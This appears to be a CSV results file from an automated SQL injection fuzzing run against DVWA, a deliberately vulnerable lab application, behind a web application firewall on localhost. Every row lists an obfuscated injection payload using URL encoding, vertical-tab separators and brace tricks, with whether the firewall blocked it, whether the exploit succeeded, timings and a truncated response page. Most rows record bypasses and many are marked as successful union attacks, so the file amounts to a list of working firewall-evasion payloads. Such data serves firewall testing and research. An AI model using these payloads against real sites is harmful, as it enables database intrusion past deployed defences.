Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=.1%0b||%0b!+1=+(false)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0244,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||%0bfalse=%0b(not%0btrue)--%0b,Bypassed,No,None,piggyAtk,0.0216,70.7,No,500,
0%27<@!=1.%0bor%0b!+{x%0b(select%0b1)}=1=%0b(!+{x%0b(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0168,70.82,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+!+true=%0b(not%7e0)+or',Bypassed,No,None,booleanAtk,0.0252,70.82,No,500,
0%27<@=1%0bor%0bnot+1=%0b(!+1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0166,70.82,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+not+{x+(select+1)}=1=+(!%0b{a+1}=1)+,Blocked,No,None,Unknown,0.0288,71.12,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+||%0b!~false=%0b(not+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0218,71.41,No,500,
0'<@!=1.+||+not%7efalse=+(!%0b{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0279,71.41,No,500,
0'<@=.1+or%0b!+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0263,71.41,No,500,
0'<@!=1.+||%0bfalse=+(!%0b{a%0b1}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.018,71.41,No,500,
0%27<@!=.1+or%0bnot+{`if`+1}=1=+(not+1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0281,71.41,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0bnot%0b{x%0b(select+1)}=1=%0b(not+{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0161,71.41,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+not%0b{`if`+1}=1=+(not%0b{x+(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0138,71.41,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+not+{`if`%0b1}=1=%0b(!~false)%0bor',Bypassed,No,None,booleanAtk,0.023,70.17,No,500,
0'<@=.1+or+not%0b{`if`%0b1}=1=+(!+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0439,70.17,No,500,
0'<@=1.+or+not+{x+(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1),Blocked,No,None,Unknown,0.0155,70.17,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor+!%0b{x%0b(select+1)}=1=%0b(not%0b{a%0b1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0301,70.17,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||%0b!+{`if`+1}=1=%0b(not%0b{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0287,70.17,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor%0b{a%0b1}=1+like+{`if`%0b1}=1%0b||',Bypassed,No,None,Unknown,0.024,70.17,No,500,
0%27<@=1+||+not%0btrue=%0b(not+{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0294,70.38,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0b{x%0b(select+1)}=1%0blike%0b{`if`+1}=1--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0222,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor+false=+(!+{x%0b(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0349,70.59,No,500,
0'<@=1+||+not~false=+(not%7e0)+or%27,Bypassed,No,None,booleanAtk,0.0317,70.59,No,500,
0%27<@=1%0b||+not~0=+(not%0b{x+(select+1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0226,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+not+{a+1}=1=%0b(!+{x+(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0245,70.59,No,500,
0%27<@!=1.+or+!%0b{x+(select%0b1)}=1=%0b(!%0b{`if`%0b1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0322,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||%0bnot+{a+1}=1=%0b(not+{x+(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0225,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||+!+1=+(!+true)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0222,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor+not+{a+1}=1=%0b(not%0b{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0107,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||%0b!+{a+1}=1=+(not%0b{x%0b(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0304,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+!~0=+(!+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0261,70.59,No,500,
0%27<@=.1+||+!+{x%0b(select+1)}=1=+(!+{`if`+1}=1)--,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.018,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+not+{`if`%0b1}=1=%0b(!+{x%0b(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0206,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0b{x%0b(select%0b1)}=1%0blike+{a+1}=1%0b||%27,Bypassed,No,None,Unknown,0.0233,70.59,No,500,
0'<@!=.1%0bor+not%0b{`if`+1}=1=%0b(!+{a%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.025,70.59,No,500,
0'<@!=.1+||+not%0b{x%0b(select+1)}=1=+(!+{a%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0349,70.59,No,500,
0'<@=1+or%0b!+{x+(select%0b1)}=1=%0b(!%0b{x%0b(select+1)}=1,Blocked,No,None,Unknown,0.0093,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0b||%0b!+{x+(select+1)}=1=+(not+{`if`%0b1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0178,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0b||+!~false=%0b(not%7efalse)+||%27,Bypassed,No,None,Unknown,0.0244,70.59,No,500,
0'<@=.1+or+not+{x%0b(select+1)}=1=%0b(!+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0372,70.59,No,500,
0'<@=1+||%0bnot%7efalse=+(not+{`if`+1}=1)--+,Blocked,No,None,piggyAtk,0.0233,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0bor+not%0b{x%0b(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0168,70.59,No,500,
0'<@!=.1+or+not+{`if`+1}=1=+(not~0)+||%27,Bypassed,No,None,Unknown,0.023,70.59,No,500,
0'<@!=.1+or%0bnot~0=+(not+{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0318,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+||+not~0=+(not%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0287,70.59,No,500,
0'<@=1+||%0b!%0b{x+(select+1)}=1=+(not+{a+1}=1)--,Blocked,No,None,piggyAtk,0.0132,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or%0bnot+{`if`%0b1}=1=%0b(not+{`if`+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.026,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor%0bfalse=+(not%7efalse)+||',Bypassed,No,None,booleanAtk,0.0289,70.59,No,500,
0'<@=1.+or+!~false=+(!+{a+1}=1)+||%27,Blocked,No,None,booleanAtk,0.0297,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+!+{a%0b1}=1=%0b(!+true)+||%27,Bypassed,No,None,Unknown,0.0322,70.59,No,500,
0%27<@=1%0b||%0bnot+{x%0b(select+1)}=1=+(false)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0401,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0b!+{a%0b1}=1=%0b(not+{a%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0307,70.7,No,500,
0%27<@=.1+||+not%7efalse=+(!+{a%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.024,70.82,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+not%0b{x%0b(select+1)}=1=+(!+{a%0b1}=1)+,Bypassed,No,None,Unknown,0.0139,70.82,No,500,
0'<@!=1.+||%0bnot%0b1=+(not+{x%0b(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0234,71.12,No,500,
0'<@=1.%0bor+not+{`if`+1}=1=%0b(false)+||%27,Bypassed,No,None,booleanAtk,0.0143,71.41,No,500,
0%27<@=1%0bor%0bnot+{x+(select+1)}=1=%0b(not~false)+||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0298,71.41,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
